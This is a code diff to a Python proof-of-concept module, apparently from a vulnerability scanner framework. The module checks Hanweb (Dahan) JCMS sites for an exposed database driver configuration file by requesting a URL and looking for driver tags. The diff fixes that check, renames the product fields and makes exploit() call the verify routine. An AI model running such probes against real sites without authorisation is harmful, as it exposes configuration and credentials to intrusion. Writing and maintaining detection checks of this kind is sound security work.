@@ -16,8 +16,8 @@ class Vuln(ABVuln):
     ref = 'Unknown'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'JCMS(Hanweb)'  # 漏洞应用名称
-    product_version = 'Unknown'  # 漏洞应用版本
+    product = 'Hanweb(大汉)'  # 漏洞应用名称
+    product_version = '大汉JCMS'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '7cdddbfd-fc97-41a3-80b3-a9905e5d80e5'
@@ -36,15 +36,15 @@ class Poc(ABPoc):
             verify_url = self.target + payload
             r = requests.get(verify_url)
             
-            if r.status_code == 200 and '<driver-class>' and '<driver-properties>' in  r.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+            if r.status_code == 200 and '<driver-class>' in  r.content and '<driver-properties>' in  r.content:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
